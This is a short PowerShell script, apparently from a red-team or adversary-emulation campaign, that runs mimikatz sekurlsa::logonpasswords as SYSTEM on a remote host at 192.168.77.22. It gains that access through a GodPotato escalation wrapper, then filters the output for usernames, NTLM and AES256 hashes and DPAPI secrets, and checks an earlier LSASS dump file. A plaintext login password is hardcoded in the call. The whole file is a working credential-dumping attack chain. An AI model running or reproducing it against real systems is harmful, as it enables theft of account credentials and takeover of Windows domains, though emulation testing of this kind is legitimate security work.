# 3.5K test: mimikatz sekurlsa LIVE as SYSTEM + verify dump file size
$ErrorActionPreference = 'Continue'

$script = @'
$ErrorActionPreference = 'Continue'
# Is the earlier dump usable? (a real lsass dump is >50MB)
$d = Get-Item 'C:\Windows\Temp\cadre-lsass.dmp' -ErrorAction SilentlyContinue
if ($d) { Write-Output "DUMP_SIZE $($d.Length)" } else { Write-Output 'DUMP_MISSING' }

# Live sekurlsa extraction (T1003.001 objective — extraction, not cracking)
$out = & 'C:\Windows\Temp\cadre-tools\mimikatz.exe' 'privilege::debug' 'sekurlsa::logonpasswords' 'exit' 2>&1
$out | Select-String -Pattern 'Authentication Id|Username|Domain|NTLM|AES256|DPAPI' | Select-Object -First 60 | ForEach-Object { $_.Line }
Write-Output 'SEKURLSA_LIVE_DONE'
'@

& 'C:\Tools\ADTools\campaign-a-t043-system-exec.ps1' -Server 192.168.77.22 -Username analyst_t1 -Password 'T13r_An@lyst!' -GpPath 'C:\Windows\Temp\cadre-tools\GodPotato.exe' -ScriptBlock $script
Write-Output 'LIVE_EXTRACT_DONE'
